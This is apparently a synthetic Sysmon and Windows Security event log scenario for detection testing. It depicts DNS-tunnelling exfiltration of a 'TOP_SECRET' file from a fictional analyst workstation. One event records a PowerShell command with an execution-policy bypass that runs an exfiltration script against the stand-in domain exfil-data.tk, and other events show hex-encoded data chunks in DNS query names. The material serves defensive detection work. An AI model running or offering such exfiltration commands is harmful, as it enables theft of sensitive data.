<!--
SCENARIO 3: Data Exfiltration via DNS Tunneling
Timeline: Compromised system exfiltrates classified data using DNS queries to attacker-controlled domain
Threat Level: CRITICAL - Data Exfiltration, Covert Channel
OCSF Mapping: Network Activity (DNS), Process Activity
Attribution: Technique used by APT33, APT34
-->

<!-- EVENT 1: Sysmon Event ID 22 - DNS Query (Data Exfiltration via DNS Tunneling) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>22</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>22</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T16:45:12.345Z" />
    <EventRecordID>923451</EventRecordID>
    <Correlation />
    <Execution ProcessID="3124" ThreadID="4856" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>CIA-ANALYST-089.intelligence.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1071.004,technique_name=Application Layer Protocol DNS</Data>
    <Data Name="UtcTime">2025-12-01 16:45:12.345</Data>
    <Data Name="ProcessGuid">{E5F6A7B8-9012-3CDE-F456-789012345678}</Data>
    <Data Name="ProcessId">3948</Data>
    <Data Name="QueryName">4E5353414C41535349464945442D52455041E4.d8f7a6b5c4.exfil-data.tk</Data>
    <Data Name="QueryStatus">0</Data>
    <Data Name="QueryResults">type: 1 TXT exfil-chunk-received-ack</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="User">INTELLIGENCE\sarah.chen</Data>
  </EventData>
</Event>

<!-- EVENT 2: Sysmon Event ID 22 - Multiple Suspicious DNS Queries (Encoded Data) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>22</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>22</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T16:45:13.567Z" />
    <EventRecordID>923452</EventRecordID>
    <Correlation />
    <Execution ProcessID="3124" ThreadID="4856" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>CIA-ANALYST-089.intelligence.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1071.004,technique_name=Application Layer Protocol DNS</Data>
    <Data Name="UtcTime">2025-12-01 16:45:13.567</Data>
    <Data Name="ProcessGuid">{E5F6A7B8-9012-3CDE-F456-789012345678}</Data>
    <Data Name="ProcessId">3948</Data>
    <Data Name="QueryName">544F505345435245542D4147454E542D4C4953.a9c8d7f6.exfil-data.tk</Data>
    <Data Name="QueryStatus">0</Data>
    <Data Name="QueryResults">type: 1 TXT chunk-2-ack</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="User">INTELLIGENCE\sarah.chen</Data>
  </EventData>
</Event>

<!-- EVENT 3: Sysmon Event ID 1 - PowerShell Script Execution (DNS Tunneling Tool) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T16:45:00.123Z" />
    <EventRecordID>923450</EventRecordID>
    <Correlation />
    <Execution ProcessID="3124" ThreadID="4856" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>CIA-ANALYST-089.intelligence.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1048.003,technique_name=Exfiltration Over Alternative Protocol</Data>
    <Data Name="UtcTime">2025-12-01 16:45:00.123</Data>
    <Data Name="ProcessGuid">{E5F6A7B8-9012-3CDE-F456-789012345678}</Data>
    <Data Name="ProcessId">3948</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\sarah.chen\AppData\Local\Temp\dns_exfil.ps1" -Target "exfil-data.tk" -File "C:\Users\sarah.chen\Documents\TOP_SECRET\Agent_List_2025.pdf"</Data>
    <Data Name="CurrentDirectory">C:\Users\sarah.chen\Documents\TOP_SECRET\</Data>
    <Data Name="User">INTELLIGENCE\sarah.chen</Data>
    <Data Name="LogonGuid">{E5F6A7B8-9012-3CDE-1111-AABBCCDD0000}</Data>
    <Data Name="LogonId">0x5F8A2</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">High</Data>
    <Data Name="Hashes">SHA256=F5E6D7C8B9A0F1E2D3C4B5A6978809F0E1D2C3B4A5968778899A0B1C2D3E4F5A</Data>
    <Data Name="ParentProcessGuid">{E5F6A7B8-9012-3CDE-F456-ABCDEF123456}</Data>
    <Data Name="ParentProcessId">7624</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
    <Data Name="ParentUser">INTELLIGENCE\sarah.chen</Data>
  </EventData>
</Event>

<!-- EVENT 4: Sysmon Event ID 11 - Suspicious Script File Creation -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T16:44:55.890Z" />
    <EventRecordID>923449</EventRecordID>
    <Correlation />
    <Execution ProcessID="3124" ThreadID="4856" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>CIA-ANALYST-089.intelligence.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell Script</Data>
    <Data Name="UtcTime">2025-12-01 16:44:55.890</Data>
    <Data Name="ProcessGuid">{E5F6A7B8-9012-3CDE-F456-999988887777}</Data>
    <Data Name="ProcessId">6852</Data>
    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="TargetFilename">C:\Users\sarah.chen\AppData\Local\Temp\dns_exfil.ps1</Data>
    <Data Name="CreationUtcTime">2025-12-01 16:44:55.890</Data>
    <Data Name="User">INTELLIGENCE\sarah.chen</Data>
  </EventData>
</Event>

<!-- EVENT 5: Windows Security Event ID 5156 - Firewall Allowed Connection (DNS over non-standard port) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
    <EventID>5156</EventID>
    <Version>1</Version>
    <Level>0</Level>
    <Task>12809</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T16:45:12.567Z" />
    <EventRecordID>3456789</EventRecordID>
    <Correlation />
    <Execution ProcessID="4" ThreadID="6124" />
    <Channel>Security</Channel>
    <Computer>CIA-ANALYST-089.intelligence.gov</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="Application">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="Direction">%%14593</Data>
    <Data Name="SourceAddress">10.45.67.89</Data>
    <Data Name="SourcePort">54321</Data>
    <Data Name="DestAddress">198.51.100.47</Data>
    <Data Name="DestPort">53</Data>
    <Data Name="Protocol">17</Data>
    <Data Name="FilterRTID">84952</Data>
    <Data Name="LayerName">%%14610</Data>
    <Data Name="LayerRTID">44</Data>
    <Data Name="RemoteUserID">S-1-0-0</Data>
    <Data Name="RemoteMachineID">S-1-0-0</Data>
  </EventData>
</Event>
